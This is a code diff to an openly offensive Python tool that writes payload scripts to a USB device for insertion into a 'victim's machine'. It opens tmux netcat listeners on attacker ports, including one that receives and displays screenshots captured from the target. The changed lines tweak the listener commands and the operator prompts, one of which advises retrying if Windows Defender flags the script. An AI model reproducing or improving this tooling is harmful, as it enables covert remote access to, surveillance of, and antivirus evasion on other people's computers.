@@ -39,12 +39,17 @@ def check_for_connection(first_port):
 
     return connection_established
 
+# ————————————————————————————————————————————————————————— #
+
+# ——— Allow the user to modify the configuration file and specify the path to the USB payload file
 def change_configuration():
     print("\n\u001b[34mEnter the path to the USB payload file, or input MANUAL for manual setup.\u001b[0m")
     payload_path = input("\u001b[90m> \u001b[0m").strip()
     with open(f"{THIS_DIRECTORY}/obscure_config.txt", "w") as f:
         f.write(payload_path)
-    print(f"{C_MARK} Configuration updated.")
+    print(f"{C_MARK} Configuration updated.\n")
+
+# ————————————————————————————————————————————————————————— #
 
 # ——— Create a new session to connect the target to the attacker's machine
 def make_new_session():
@@ -57,7 +62,7 @@ def make_new_session():
     response = input().strip().lower()
     if response == "c":
         change_configuration()
-        sys.exit()
+        return
     elif response != "y":
         print(f"{X_MARK} Session initiation cancelled.")
         sys.exit()
@@ -98,7 +103,7 @@ def make_new_session():
         run(["tmux", "new-session", "-d", "-s", f"listener-{port}"])
         
         if i == 1: # If the second port, set up listener to capture screenshot
-            run(["tmux", "send-keys", "-t", f"listener-{port}", f"while true; do nc -q 0 -lvnp {port} > out/capture.png; feh -x out/capture.png --geometry 1200x800+10-10 -. -Z --image-bg black; sleep 1; done", "ENTER"])
+            run(["tmux", "send-keys", "-t", f"listener-{port}", f"while true; r=$RANDOM; do nc -q 0 -lvnp {port} > {THIS_DIRECTORY}/out/capture_$r.png; feh -x {THIS_DIRECTORY}/out/capture_$r.png --geometry 1200x800+10-10 -. -Z --image-bg black; sleep 1; done", "ENTER"])
         
         else: # Otherwise, set up normal listener
             run(["tmux", "send-keys", "-t", f"listener-{port}", f"while true; do nc -lvnp {port}; sleep 1; done", "ENTER"])
@@ -172,7 +177,7 @@ def make_new_session():
 
     if config_usb != "MANUAL": # Default mode, writing to USB
 
-        print("\u001b[34mInsert USB and press Enter.\u001b[90m",end=" ")
+        print("\u001b[34mInsert USB in setup mode and press Enter.\u001b[90m",end=" ")
         wait = input()
 
         # ——— Attempt to write scripts to USB, retrying on failure
@@ -203,7 +208,7 @@ def make_new_session():
         print(f"{C_MARK} Scripts wrote to USB.")
         print(
             "\n\u001b[34m" \
-            "Remove the USB and insert it into the victim's machine.\n" \
+            "Insert the USB in payload mode into the victim's machine.\n" \
             "If Windows Defender flags the script, try inserting the USB again.\n\u001b[90m"
         )
     
@@ -230,6 +235,8 @@ def make_new_session():
         sleep(1)
 
     create_interface(True) # Once connection is established, create interface for user to interact with target
+
+# ————————————————————————————————————————————————————————— #
 
 def run_command(queued_command):
     c_info = ""
